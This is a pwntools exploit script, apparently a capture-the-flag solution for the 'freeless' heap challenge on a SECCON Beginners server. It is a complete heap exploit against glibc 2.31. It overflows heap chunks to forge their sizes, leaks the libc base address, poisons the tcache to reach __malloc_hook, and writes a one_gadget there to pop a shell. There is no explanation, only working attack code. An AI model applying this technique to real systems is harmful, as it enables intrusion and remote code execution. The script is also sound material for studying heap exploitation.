#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('freeless.quals.beginners.seccon.jp', 9077)

def new(index, size):
    s.sendlineafter('> ', '1')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('size: ', str(size))

def edit(index, data):
    s.sendlineafter('> ', '2')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('data: ', data)

def show(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('index: ', str(index))
    s.recvuntil('data: ')
    return s.recvline(False)

libc = ELF('./libc-2.31.so')

new(0, 0xd08)
new(1, 0x18)
edit(1, b'A' * 0x18 + p64(0x41))
new(2, 0x48)

new(3, 0xa78)
new(4, 0x28)
edit(4, b'A' * 0x28 + p64(0x501))
new(5, 0x600)
edit(4, b'A' * 0x30)
libc.address = u64(show(4)[0x30:].ljust(8, b'\0')) - 0x1ebbe0
log.info('libc base: %#x' % libc.address)
edit(4, b'A' * 0x28 + p64(0x4e0))
new(6, 0x4d8)

new(7, 0x978)
new(8, 0x28)
edit(8, b'A' * 0x28 + p64(0x41))
new(9, 0x600)

edit(8, b'A' * 0x28 + p64(0x21) + p64(libc.symbols['__malloc_hook']))
new(10, 0x18)
new(11, 0x18)
one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
edit(11, p64(libc.address + one_gadgets[1]))

new(12, 0)

s.interactive()
